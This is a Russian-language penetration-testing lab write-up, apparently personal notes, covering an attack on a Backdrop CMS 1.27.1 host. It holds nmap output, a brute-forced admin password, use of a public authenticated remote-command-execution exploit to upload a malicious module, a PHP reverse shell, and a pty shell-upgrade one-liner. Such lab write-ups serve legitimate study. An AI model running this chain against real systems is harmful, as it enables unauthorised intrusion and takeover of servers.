>[!tip]- nmap
 -iL scoupout -p10050,10051,10250,10255,1099,111,135,139,143,1433,1434,1500,1521-1527,1540,1541,161,179,2001,2010,2049,21,2181,22,2222,23,2375,2376,2379,25,27017,27018,2809,3050,3200-3299,3306,3389,389,443,445,4678,4786,4848,4899,49152,50013,50070,53,5432,5433,5555,5557,5558,5559,5601,5666,5800-5810,5900,5901,5985,5986,623,636,6379,6443,7001,7873,80,8000,8001,8002,8004,8006,8007,8008,8080,8081,8111,8180,8200,8201,8291,8400,8443,8500,8501,873,88,8879,8888,9000,9043,9060,9080,9200,9300,9443,9501,9502,9503 -sVC --open -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 17:27 MSK
Nmap scan report for 10.114.0.98
Host is up (0.036s latency).
Not shown: 212 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 c1:44:09:2c:87:f3:5d:46:68:26:aa:43:bb:ac:6f:9d (RSA)
|   256 81:4e:1d:b7:55:53:7c:93:29:3e:58:9a:37:a3:ad:32 (ECDSA)
|_  256 71:62:b5:ff:e2:0f:8d:25:3e:30:04:1e:48:e2:65:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | We help you create a comfortable future
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap scan report for 10.114.0.125
Host is up (0.035s latency).
Not shown: 213 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
443/tcp open  https?
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 5 IP addresses (5 hosts up) scanned in 46.31 seconds

находим сайт it_solutions.com и добавляем в hosts
Находим логины adminer1-7, используя данные пароли попробуем брутфорс
подбираем пароль adminer6:password
Затем определяем версию Backdrop CMS 1.27.1 и находим эксплоит ([Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) - PHP webapps Exploit](https://www.exploit-db.com/exploits/52021))
создаем эксплоит
```
python3 52021.py http://it_solutions.com           
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://it_solutions.com/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://it_solutions.com/modules/shell/shell.php

```
Также создаем php revshell доступ ( созданый ранее shell.php дает нам RCE) с помощью revshells.com
Добавляем все в архив tar
```
tar cf shell.tar shell
```

Затем загружаем архив по адресу http://10.114.0.98/admin/installer/manual 
после загрузке переходим по адресу 10.114.0.98/modules/shell/revshells.php и получаем обратный шелл под пользователем www-data
Создаем стабильный шелл
```
python -c "import pty; pty.spawn('/bin/bash')"
```
